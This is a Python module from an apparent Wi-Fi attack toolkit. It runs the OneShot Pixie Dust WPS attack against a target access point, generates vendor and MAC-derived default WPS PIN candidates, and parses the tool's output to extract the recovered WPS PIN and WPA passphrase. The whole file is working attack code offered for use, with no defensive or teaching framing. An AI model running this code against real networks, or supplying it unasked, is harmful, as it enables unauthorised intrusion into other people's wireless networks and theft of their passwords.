# -*- coding: utf-8 -*-
"""OneShot pixie fallback + static/vendor PIN candidates.

OneShot runs in managed mode (wpa_supplicant + pixiewps). Vendor PINs are a
capped set from OneShot's WPSpin (MAC/static/empty) — never online 10M BF.
"""
import importlib.util
import os
import re
import select
import subprocess
import sys
import time

import config
from attack import tools
from attack.model import AttackEvent, EventType

ONESHOT_PY = os.path.join(config.PROJECT_DIR, "tools", "oneshot", "oneshot.py")
VENDOR_MAX = 8
VENDOR_TRY_SEC = 25

_PIN_RE = re.compile(
    r"(?:WPS PIN|PIN(?:\s+is)?|Pin is)\s*[:=]?\s*'?([0-9]{4,8}|)'?",
    re.I)
_PSK_RE = re.compile(
    r"(?:WPA PSK|WPA passphrase|PSK)\s*[:=]?\s*'?([^'\s]+)'?",
    re.I)


def available():
    return (os.path.isfile(ONESHOT_PY)
            and bool(tools.which("pixiewps", "/usr/bin/pixiewps"))
            and bool(tools.which("wpa_supplicant", "/sbin/wpa_supplicant",
                                 "/usr/sbin/wpa_supplicant")))


def _load_wpspin():
    if not os.path.isfile(ONESHOT_PY):
        return None
    spec = importlib.util.spec_from_file_location("oneshot_vendored", ONESHOT_PY)
    if not spec or not spec.loader:
        return None
    mod = importlib.util.module_from_spec(spec)
    # Avoid running oneshot's CLI main
    sys.modules["oneshot_vendored"] = mod
    spec.loader.exec_module(mod)
    return mod.WPSpin()


def vendor_candidates(bssid, limit=VENDOR_MAX):
    """Suggested then fill with MAC algos; dedupe; cap at limit."""
    gen = _load_wpspin()
    if not gen:
        return []
    out = []
    seen = set()
    try:
        suggested = gen.getSuggested(bssid) or []
    except Exception:  # noqa: BLE001
        suggested = []
    for item in suggested:
        pin = item.get("pin")
        if pin is None:
            continue
        pin = str(pin)
        if pin in seen:
            continue
        seen.add(pin)
        out.append({"algo": item.get("id") or "suggest", "pin": pin})
        if len(out) >= limit:
            return out
    # Fill with core MAC algos if suggestions empty / short
    for algo in ("pinEmpty", "pin24", "pinDLink", "pinASUS", "pin28",
                 "pin32", "pinAirocon", "pinBrcm1"):
        if len(out) >= limit:
            break
        try:
            pin = str(gen.generate(algo, bssid))
        except Exception:  # noqa: BLE001
            continue
        if pin in seen:
            continue
        seen.add(pin)
        out.append({"algo": algo, "pin": pin})
    return out[:limit]


def _parse_creds(text):
    pin = psk = None
    for line in (text or "").splitlines():
        m = _PIN_RE.search(line)
        if m and m.group(1) is not None and m.group(1) != "":
            pin = m.group(1)
        # empty pin match: allow explicit empty
        if re.search(r"Empty PIN|PIN\s*[:=]\s*''", line, re.I):
            pin = pin or ""
        m = _PSK_RE.search(line)
        if m:
            psk = m.group(1).strip("'\"")
    return pin, psk


def run_pixie(iface, target, emit, stop_flag, timeout=60):
    """Managed-mode OneShot -K. Returns {ok, pin, psk, reason, t}."""
    bssid = target.get("bssid")
    essid = target.get("essid") or bssid
    if not available():
        return {"ok": False, "reason": "missing", "t": 0.0}
    if not iface or not bssid:
        return {"ok": False, "reason": "no iface", "t": 0.0}

    cmd = [sys.executable, ONESHOT_PY, "-i", iface, "-b", bssid, "-K", "-v"]
    tools.log("oneshot spawn: %s" % " ".join(cmd))
    emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                     phase="OSHOT", countdown=timeout, cd_max=timeout))
    start = time.time()
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1)
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "reason": str(e)[:20], "t": 0.0}

    buf = []
    pin = psk = None
    reason = "timeout"
    fd = proc.stdout.fileno()
    try:
        while (time.time() - start) < timeout:
            if stop_flag and stop_flag.is_set():
                reason = "cancelled"
                break
            left = max(0, int(timeout - (time.time() - start)))
            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                                 phase="OSHOT", countdown=left, cd_max=timeout))
                if proc.poll() is not None:
                    break
                continue
            line = proc.stdout.readline()
            if not line:
                if proc.poll() is not None:
                    break
                continue
            line = line.rstrip()
            if line:
                tools.log("oneshot: %s" % line[:200])
                buf.append(line)
            p, k = _parse_creds(line)
            if p is not None:
                pin = p
            if k is not None:
                psk = k
                reason = "ok"
                break
            if pin is not None and re.search(
                    r"WPA PSK|PSk|passphrase|connected", line, re.I):
                pass
            if re.search(r"WPS pin not found|Pixie.?Dust.*fail|"
                         r"offline attack failed", line, re.I):
                reason = "pixie fail"
                break
        else:
            reason = "timeout"
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:  # noqa: BLE001
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass

    rest = ""
    try:
        if proc.stdout:
            rest = proc.stdout.read() or ""
    except Exception:  # noqa: BLE001
        pass
    if rest:
        p, k = _parse_creds(rest)
        if p is not None:
            pin = p
        if k is not None:
            psk = k
    t = time.time() - start
    if psk is not None:
        return {"ok": True, "psk": psk, "pin": pin, "reason": "ok", "t": t}
    if pin is not None:
        return {"ok": True, "pin": pin, "psk": None, "reason": "ok", "t": t}
    return {"ok": False, "reason": reason, "t": t, "pin": pin, "psk": None}
